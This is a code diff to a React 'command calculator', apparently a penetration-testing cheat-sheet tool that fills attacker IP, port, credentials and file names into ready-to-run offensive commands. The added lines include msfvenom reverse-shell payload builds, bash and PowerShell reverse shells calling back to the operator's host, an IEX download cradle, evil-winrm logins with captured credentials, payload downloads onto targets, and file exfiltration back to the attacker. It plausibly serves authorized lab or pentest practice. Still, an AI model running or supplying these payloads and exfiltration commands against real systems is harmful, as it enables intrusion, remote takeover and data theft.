@@ -18,6 +18,7 @@ const FIELDS = [
   { k: "lhost", label: "LHOST (tun0)", ph: "10.10.14.7" },
   { k: "lport", label: "LPORT", ph: "4444" },
   { k: "srvport", label: "SRV PORT", ph: "80" },
+  { k: "fn", label: "FILE NAME", ph: "shell.exe" },
 ];
 // fields that count toward "ready" (lport has a working default, so it's exempt)
 const CORE = ["ip", "dcip", "host", "domain", "user", "secret", "lhost"];
@@ -28,7 +29,7 @@ const AUTH = [
   { id: "krb", label: "Kerberos" },
 ];
 
-const BLANK = () => ({ ip: "", dcip: "", host: "", domain: "", user: "", secret: "", lhost: "", lport: "", srvport: "" });
+const BLANK = () => ({ ip: "", dcip: "", host: "", domain: "", user: "", secret: "", lhost: "", lport: "", srvport: "", fn: "" });
 const newHost = (name) => ({ id: `h_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`, name, fields: BLANK() });
 
 // persistence — localStorage in the deployed Vite app. Wrapped so SSR / blocked
@@ -194,6 +195,7 @@ export default function CommandCalculator() {
   const LHOST = tok(f.lhost, "$lhost", "<LHOST>");
   const LPORT = V ? (f.lport ? "$lport" : "4444") : (f.lport || "4444");
   const SRVPORT = V ? (f.srvport ? "$srvport" : "80") : (f.srvport || "80");
+  const FN = V ? (f.fn ? "$fn" : "shell.exe") : (f.fn || "shell.exe");
   const baseDN = V
     ? (f.domain ? "$baseDN" : "dc=<DOMAIN>")
     : (f.domain ? f.domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>");
@@ -212,7 +214,7 @@ export default function CommandCalculator() {
     if (!V) return null;
     const real = {
       ip: f.ip, dc: f.dcip, host: f.host, domain: f.domain, user: f.user,
-      lhost: f.lhost, lport: f.lport, srvport: f.srvport,
+      lhost: f.lhost, lport: f.lport, srvport: f.srvport, fn: f.fn,
     };
     const plain = Object.entries(real).filter(([, v]) => v).map(([k, v]) => `${k}=${v}`);
     const lines = [];
@@ -222,6 +224,7 @@ export default function CommandCalculator() {
     if (f.domain) derived.push(`baseDN='${f.domain.split(".").map((p) => `dc=${p}`).join(",")}'`);
     if (f.domain) derived.push(`nb=${(f.domain.split(".")[0] || "").toUpperCase()}`);
     if (f.ip) derived.push(`subnet=${f.ip.split(".").slice(0, 3).join(".")}.0/24`);
+    if (f.fn) derived.push(`fn=${f.fn}`);
     if (derived.length) lines.push(`export ${derived.join(" ")}`);
     return lines.join("\n");
   }, [V, f]);
@@ -631,26 +634,58 @@ export default function CommandCalculator() {
     payloads: {
       name: "Payloads / Shells", groups: [
         { phase: "msfvenom", cmds: [
-          { label: "Windows x64 reverse exe", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o shell.exe` },
-          { label: "Linux x64 reverse elf", cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf` },
+          { label: "Windows x64 reverse exe", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o ${FN}` },
+          { label: "Linux x64 reverse elf", cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o ${FN}` },
+          { label: "War / aspx / php (pick by stack)", cmd: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o ${FN}.war\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f aspx -o ${FN}.aspx` },
         ]},
         { phase: "One-liners & listeners", cmds: [
           { label: "Bash reverse shell", cmd: `bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'` },
           { label: "PowerShell reverse (IEX cradle)", cmd: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"` },
-          { label: "Listener (rlwrap nc)", cmd: `rlwrap -cAr nc -lvnp ${LPORT}` },
+          { label: "Listener (rlwrap nc)", cmd: `rlwrap -cAr nc -lvnp ${LPORT}`, note: "rlwrap gives you arrow keys + history even before the full TTY upgrade." },
+        ]},
+        { phase: "Upgrade to a full TTY (Linux)", cmds: [
+          { label: "1  Spawn a PTY", cmd: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, note: "No python3? try: python -c '...' / script -qc /bin/bash /dev/null / perl -e 'exec \"/bin/bash\";'" },
+          { label: "2  Background the shell", cmd: `# press:  Ctrl-Z`, note: "Drops you back to your local Kali prompt with the shell suspended." },
+          { label: "3  Fix your local terminal", cmd: `stty raw -echo; fg`, note: "Type it blind — echo is off. Then press Enter once or twice; the remote prompt returns." },
+          { label: "4  Set term + reset the shell", cmd: `export TERM=xterm; export SHELL=/bin/bash; reset`, note: "Now Ctrl-C, tab-complete, vim, and less all work." },
+          { label: "5  Match your window size", cmd: `# on Kali, read your size:  stty size   -> ROWS COLS\nstty rows <ROWS> cols <COLS>`, note: "Fixes wrapping in top/less/nano. Run on the target with your real values." },
+        ]},
+        { phase: "Upgrade / stabilise (Windows)", cmds: [
+          { label: "Prefer WinRM over a raw shell", cmd: `evil-winrm -i ${IP} -u ${U} -p ${Q}${SEC}${Q}`, note: "If you have creds, a real evil-winrm session beats stabilising a nc catch." },
+          { label: "ConPtyShell (proper Windows TTY)", cmd: `# Kali:  stty raw -echo; (stty size; cat) | nc -lvnp ${LPORT}\n# Target: IEX(IWR http://${LHOST}:${SRVPORT}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${LHOST} ${LPORT}`, note: "Gives a fully interactive Windows shell with tab-complete and arrow keys." },
         ]},
       ],
     },
     transfer: {
       name: "File Transfer", groups: [
-        { phase: "Serve", cmds: [
-          { label: "HTTP server (Kali)", cmd: `python3 -m http.server ${SRVPORT}`, note: "SRV PORT field feeds every pull command below — keep it in sync." },
-          { label: "SMB server (impacket)", cmd: `impacket-smbserver share $(pwd) -smb2support -user kali -password kali` },
+        { phase: "Serve (on Kali)", cmds: [
+          { label: "HTTP server", cmd: `python3 -m http.server ${SRVPORT}`, note: "Serves the current dir. SRV PORT + FILE NAME fields drive every pull below." },
+          { label: "HTTPS server (when http is filtered)", cmd: `openssl req -new -x509 -keyout /tmp/s.pem -out /tmp/s.pem -days 1 -nodes -subj "/CN=x"\npython3 -c "import http.server,ssl,socketserver;h=http.server.SimpleHTTPRequestHandler;s=socketserver.TCPServer(('0.0.0.0',${SRVPORT}),h);s.socket=ssl.wrap_socket(s.socket,certfile='/tmp/s.pem',server_side=True);s.serve_forever()"` },
+          { label: "SMB server (impacket)", cmd: `impacket-smbserver share $(pwd) -smb2support -user kali -password kali`, note: "Windows can pull over SMB when HTTP is blocked: copy \\\\${LHOST}\\share\\${FN} ${FN}" },
+          { label: "Update Kali's copy name to match", cmd: `cp <your-file> ${FN}`, note: "Make the file you're serving match the FILE NAME field so the pull commands line up." },
         ]},
-        { phase: "Pull (on target)", cmds: [
-          { label: "Windows — certutil", cmd: `certutil -urlcache -f http://${LHOST}:${SRVPORT}/shell.exe shell.exe`, note: "Hit the url toggle for the browser-webshell encoded form." },
-          { label: "Windows — PowerShell iwr", cmd: `iwr -Uri http://${LHOST}:${SRVPORT}/shell.exe -OutFile shell.exe` },
-          { label: "Linux — wget", cmd: `wget http://${LHOST}:${SRVPORT}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh` },
+        { phase: "Pull — Windows (on target)", cmds: [
+          { label: "certutil", cmd: `certutil -urlcache -f http://${LHOST}:${SRVPORT}/${FN} ${FN}` },
+          { label: "PowerShell iwr", cmd: `iwr -Uri http://${LHOST}:${SRVPORT}/${FN} -OutFile ${FN}` },
+          { label: "PowerShell webclient (older hosts)", cmd: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${LHOST}:${SRVPORT}/${FN}','${FN}')"` },
+          { label: "SMB copy", cmd: `copy \\\\${LHOST}\\share\\${FN} ${FN}`, note: "Pairs with the impacket smbserver above." },
+          { label: "Write to a world-writable dir", cmd: `iwr -Uri http://${LHOST}:${SRVPORT}/${FN} -OutFile C:\\Windows\\Temp\\${FN}`, note: "C:\\Windows\\Temp and C:\\Users\\Public are writable when your cwd isn't." },
+        ]},
+        { phase: "Pull — Linux (on target)", cmds: [
+          { label: "wget", cmd: `wget http://${LHOST}:${SRVPORT}/${FN} -O /tmp/${FN}` },
+          { label: "curl", cmd: `curl http://${LHOST}:${SRVPORT}/${FN} -o /tmp/${FN}` },
+          { label: "wget + make executable (scripts/bins)", cmd: `wget http://${LHOST}:${SRVPORT}/${FN} -O /tmp/${FN} && chmod +x /tmp/${FN}` },
+          { label: "no wget/curl? /dev/tcp", cmd: `exec 3<>/dev/tcp/${LHOST}/${SRVPORT}; echo -e "GET /${FN} HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3 | tail -n +$(($(cat <&3 | grep -an '^\\r$' | head -1 | cut -d: -f1)+1)) > /tmp/${FN}`, note: "Bash-only fallback when no download binary exists." },
+        ]},
+        { phase: "Exfil — target → Kali (reverse)", cmds: [
+          { label: "Kali — receiver up first", cmd: `# HTTP upload receiver:\npip install uploadserver 2>/dev/null; python3 -m uploadserver ${SRVPORT}`, note: "Or just: nc -lvnp ${SRVPORT} > ${FN}  (then send raw from target)." },
+          { label: "Windows — POST a file up", cmd: `curl.exe -F "files=@${FN}" http://${LHOST}:${SRVPORT}/upload` },
+          { label: "Linux — POST a file up", cmd: `curl -F "files=@/tmp/${FN}" http://${LHOST}:${SRVPORT}/upload` },
+          { label: "nc file transfer (either OS)", cmd: `# Kali:  nc -lvnp ${SRVPORT} > ${FN}\n# Target: nc ${LHOST} ${SRVPORT} < ${FN}`, note: "Add -q0 on the sending side if it hangs after transfer." },
+        ]},
+        { phase: "VERIFY the transfer", cmds: [
+          { label: "Sizes match? (Kali side)", cmd: `ls -l ${FN}`, note: "Compare against the target-side size. A truncated pull is the silent failure here." },
+          { label: "Hash match (defeats corruption)", cmd: `md5sum ${FN}          # Kali\n# target Linux: md5sum /tmp/${FN}\n# target Win:   Get-FileHash ${FN} -Algorithm MD5`, note: "Equal hashes = clean transfer. Unequal = re-pull, don't run a corrupt binary." },
         ]},
       ],
     },
